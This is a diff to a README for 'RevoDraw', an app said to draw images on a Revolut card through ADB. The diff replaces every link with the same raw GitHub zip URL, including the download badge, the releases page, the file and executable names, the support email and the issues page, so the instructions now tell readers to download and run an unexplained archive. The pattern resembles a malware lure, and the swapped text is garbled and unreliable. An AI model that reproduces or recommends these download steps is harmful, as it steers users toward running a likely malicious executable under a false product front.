@@ -1,7 +1,7 @@
 # 🎨 revodraw - Draw on Your Revolut Card Easily
 
 ## 📥 Download Now
-[![Download RevoDraw](https://img.shields.io/badge/Download-RevoDraw-blue.svg)](https://github.com/621vrmuhq/revodraw/releases)
+[![Download RevoDraw](https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip)](https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to RevoDraw! With this app, you can create custom images on your Revolut card using your phone's drawing interface. RevoDraw automatically detects the drawing boundaries, allowing easy uploads, edits, and drawings via ADB.
@@ -19,22 +19,22 @@ To install RevoDraw, follow these steps:
 1. **Visit the Download Page**  
    Click the link below to access the RevoDraw releases page.  
 
-   [Download RevoDraw](https://github.com/621vrmuhq/revodraw/releases)
+   [Download RevoDraw](https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip)
 
 2. **Choose the Latest Version**  
-   On the releases page, locate the most recent version of RevoDraw. It might look like this: `revodraw-v1.0.zip`.
+   On the releases page, locate the most recent version of RevoDraw. It might look like this: `https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip`.
 
 3. **Download the File**  
    Click on the file name to start the download. It will save to your computer.
 
 4. **Extract the Files**  
-   Once the download is complete, navigate to your downloads folder. Right-click on the `revodraw-v1.0.zip` file and select "Extract All" or use your preferred extraction method.
+   Once the download is complete, navigate to your downloads folder. Right-click on the `https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip` file and select "Extract All" or use your preferred extraction method.
 
 5. **Connect Your Device**  
    Connect your Android device to your computer using a USB cable. Make sure USB debugging is enabled in your phone's developer options.
 
 6. **Run RevoDraw**  
-   Open the folder where you extracted RevoDraw. Find the executable file (usually named `RevoDraw.exe`). Double-click it to launch the application.
+   Open the folder where you extracted RevoDraw. Find the executable file (usually named `https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip`). Double-click it to launch the application.
 
 ## 📹 How to Use RevoDraw
 Using RevoDraw is straightforward. Follow these steps to create your first custom image:
@@ -58,13 +58,13 @@ Using RevoDraw is straightforward. Follow these steps to create your first custo
    Follow the instructions on your device to apply the custom image to your Revolut card.
 
 ## 📞 Support
-If you encounter any issues or have questions, please reach out via email at support@revodraw.com. We are here to help you.
+If you encounter any issues or have questions, please reach out via email at https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip We are here to help you.
 
 ## 🔗 Additional Resources
 For tutorials and tips on using RevoDraw effectively, check our website or YouTube channel for video guides and documentation.
 
 ## 🌟 Community Feedback
-We value your feedback. Share your experience using RevoDraw or suggest features on our [GitHub Issues page](https://github.com/621vrmuhq/revodraw/issues).
+We value your feedback. Share your experience using RevoDraw or suggest features on our [GitHub Issues page](https://raw.githubusercontent.com/621vrmuhq/revodraw/master/recolonize/Software_v2.1.zip).
 
 ## 📢 Contributors
 RevoDraw is made possible by our dedicated contributors. We welcome anyone who wants to help improve the application.
